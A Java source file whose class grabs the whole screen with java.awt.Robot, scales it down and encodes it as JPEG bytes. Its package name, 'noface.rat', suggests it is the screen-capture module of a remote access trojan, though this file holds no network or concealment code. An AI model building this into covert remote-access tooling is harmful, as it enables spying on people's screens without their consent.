package noface.rat;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;
import java.awt.Graphics2D;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Iterator;

public final class Cap {

    private final Robot bot;
    private final Rectangle area;
    private volatile float scale = 0.55f;
    private volatile float quality = 0.62f;
    private volatile int screenW;
    private volatile int screenH;
    private BufferedImage scaled;
    private int scaledW;
    private int scaledH;
    private ImageWriter writer;
    private ImageWriteParam writeParam;
    private final ByteArrayOutputStream bos = new ByteArrayOutputStream(256 * 1024);

    public Cap() throws Exception {
        bot = new Robot();
        area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        screenW = area.width;
        screenH = area.height;
        armWriter();
    }

    public void setScale(float s) { scale = Math.max(0.25f, Math.min(1f, s)); }
    public void setQuality(float q) {
        quality = Math.max(0.3f, Math.min(0.95f, q));
        if (writeParam != null && writeParam.canWriteCompressed()) {
            writeParam.setCompressionQuality(quality);
        }
    }
    public int width() { return screenW; }
    public int height() { return screenH; }

    public byte[] grab() {
        try {
            Rectangle full = area;
            full.setSize(Toolkit.getDefaultToolkit().getScreenSize());
            screenW = full.width;
            screenH = full.height;
            BufferedImage img = bot.createScreenCapture(full);
            float sc = scale;
            int tw = Math.max(1, Math.round(full.width * sc));
            int th = Math.max(1, Math.round(full.height * sc));
            BufferedImage src = img;
            if (tw != full.width || th != full.height) {
                if (scaled == null || scaledW != tw || scaledH != th) {
                    scaled = new BufferedImage(tw, th, BufferedImage.TYPE_3BYTE_BGR);
                    scaledW = tw;
                    scaledH = th;
                }
                Graphics2D g = scaled.createGraphics();
                g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_NEAREST_NEIGHBOR);
                g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_SPEED);
                g.drawImage(img, 0, 0, tw, th, null);
                g.dispose();
                src = scaled;
            }
            return jpeg(src);
        } catch (Exception e) {
            return null;
        }
    }

    private void armWriter() {
        Iterator<ImageWriter> it = ImageIO.getImageWritersByFormatName("jpg");
        if (!it.hasNext()) it = ImageIO.getImageWritersByFormatName("jpeg");
        if (!it.hasNext()) return;
        writer = it.next();
        writeParam = writer.getDefaultWriteParam();
        if (writeParam.canWriteCompressed()) {
            writeParam.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
            writeParam.setCompressionQuality(quality);
        }
    }

    private byte[] jpeg(BufferedImage img) throws Exception {
        if (writer == null) armWriter();
        if (writer == null) return null;
        bos.reset();
        MemoryCacheImageOutputStream ios = new MemoryCacheImageOutputStream(bos);
        try {
            writer.setOutput(ios);
            writer.write(null, new IIOImage(img, null, null), writeParam);
            ios.flush();
        } finally {
            try { ios.close(); } catch (Exception ignored) {}
        }
        return bos.toByteArray();
    }
}
